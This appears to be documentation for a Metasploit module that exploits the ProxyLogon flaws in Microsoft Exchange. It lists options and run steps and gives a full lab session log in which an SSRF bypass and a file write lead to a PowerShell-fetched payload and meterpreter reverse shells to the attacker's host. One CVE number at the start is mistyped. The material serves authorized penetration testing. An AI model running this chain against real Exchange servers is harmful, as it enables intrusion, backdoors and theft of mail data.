## Vulnerable Application

CVE-2021-28855 is a pre-authentication SSRF (Server Side Request Forgery) which allows an attacker to
bypass authentication by sending specially crafted HTTP requests. This vulnerability is part of an attack
chain used to perform an RCE (Remote Code Execution).

CVE-2021-27065 is a post-auth arbitrary-file-write vulnerability to get code execution and the second part
of ProxyLogon attack chain.

This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013,
Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

### Introduction

This module exploit a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the
authentication, impersonating as the admin (CVE-2021-26855) and write arbitrary file (CVE-2021-27065) to
get the RCE (Remote Code Execution).

By taking advantage of this vulnerability, you can execute arbitrary commands on the remote Microsoft
Exchange Server.

All components are vulnerable by default.

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/windows/http/exchange_proxylogon_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set EMAIL [EMAIL ADDRESS]`
5. Do: `run`

## Options

### EMAIL

A known email address for this organization.

### METHOD

HTTP Method to use for the check (only). Default: POST

### UseAlternatePath

Use the IIS root dir as alternate path. Default: false

## Advanced Options

### ExchangeBasePath

The base path where exchange is installed. Default: C:\Program Files\Microsoft\Exchange Server\V15

### ExchangeWritePath

The path where you want to write the backdoor. Default: owa\auth

You can for example, define to: ecp\auth

### IISBasePath

The base path where IIS wwwroot directory is. Default: C:\inetpub\wwwroot

### MapiClientApp

This is MAPI client version sent in the request.

### MaxWaitLoop

Max counter loop to wait for OAB Virtual Dir reset. Default: 30

## Scenarios

```
msf6 exploit(windows/http/exchange_proxylogon_rce) > options 

Module options (exploit/windows/http/exchange_proxylogon_rce):

   Name     Current Setting           Required  Description
   ----     ---------------           --------  -----------
   EMAIL    gaston.lagaffe@pwned.lab  yes       A known email address for this organization
   METHOD   POST                      yes       HTTP Method to use for the check (Accepted: GET, POST)
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   172.20.2.112              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    443                       yes       The target port (TCP)
   SSL      true                      no        Negotiate SSL/TLS for outgoing connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                            no        The URI to use for this exploit (default is random)
   VHOST                              no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.20.2.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Dropper


msf6 exploit(windows/http/exchange_proxylogon_rce) > run

[*] Started reverse TCP handler on 172.20.2.12:4444 
[*] Using auxiliary/scanner/http/exchange_proxylogon as check
[+] https://172.20.2.112:443 - The target is vulnerable to CVE-2021-26855.
[*] Scanned 1 of 1 hosts (100% complete)
[+] The target appears to be vulnerable
[*] https://172.20.2.112:443 - Attempt to exploit for CVE-2021-26855
[*] Internal server name (EX02)
[*] https://172.20.2.112:443 - Sending autodiscover request
[*] Server: c7f46eae-bac1-49e7-8502-afe90609ea7f@pwned.lab
[*] LegacyDN: /o=Pwned Exch2k13-HA/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=683c605c88c14fcca1f5e74d0d136461-Gaston
[*] https://172.20.2.112:443 - Sending mapi request
[*] SID: S-1-5-21-3876225949-3666446388-246247518-1156 (gaston.lagaffe@pwned.lab)
[*] https://172.20.2.112:443 - Sending ProxyLogon request
[*] Try to get a good msExchCanary (by patching user SID method)
[*] ASP.NET_SessionId: a4fd3b7a-5835-419b-a6d1-0fc7e6570639
[*] msExchEcpCanary: N2LyPutF3EeUa1GvrAh5pK2NzUjC69gIXx5QmTG8m_1hFOyUrbb7igvdhFcRO2SK54d6VIAd8F8.
[*] OAB id: ee967fff-2665-4333-b396-164b9c58495c (OAB (Default Web Site))
[*] https://172.20.2.112:443 - Attempt to exploit for CVE-2021-27065
[*] Prepare the payload on the remote target
[*] Write the payload on the remote target
[!] Wait a lot (0)
[+] Yeeting windows/x64/meterpreter/reverse_tcp payload at 172.20.2.112:443
[*] Using URL: http://0.0.0.0:8080/zHDOA5lOrSPE
[*] Local IP: http://172.20.2.12:8080/zHDOA5lOrSPE
[*] Client 172.20.2.112 (Mozilla/5.0 (Windows NT; Windows NT 6.3; fr-FR) WindowsPowerShell/4.0) requested /zHDOA5lOrSPE
[*] Sending payload to 172.20.2.112 (Mozilla/5.0 (Windows NT; Windows NT 6.3; fr-FR) WindowsPowerShell/4.0)
[*] Client 172.20.2.112 (Mozilla/5.0 (Windows NT; Windows NT 6.3; fr-FR) WindowsPowerShell/4.0) requested /zHDOA5lOrSPE
[*] Sending payload to 172.20.2.112 (Mozilla/5.0 (Windows NT; Windows NT 6.3; fr-FR) WindowsPowerShell/4.0)
[*] Sending stage (200262 bytes) to 172.20.2.112
[*] Meterpreter session 7 opened (172.20.2.12:4444 -> 172.20.2.112:57328) at 2021-03-18 21:05:01 +0400
[*] Sending stage (200262 bytes) to 172.20.2.112
[*] Meterpreter session 8 opened (172.20.2.12:4444 -> 172.20.2.112:57329) at 2021-03-18 21:05:01 +0400
[*] Server stopped.
[!] This exploit may require manual cleanup of 'C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\GoWdK.aspx' on the target

meterpreter > 
```

## References

1. <https://proxylogon.com/>
2. <http://aka.ms/exchangevulns>
3. <https://www.praetorian.com/blog/reproducing-proxylogon-exploit>
4. <https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265>
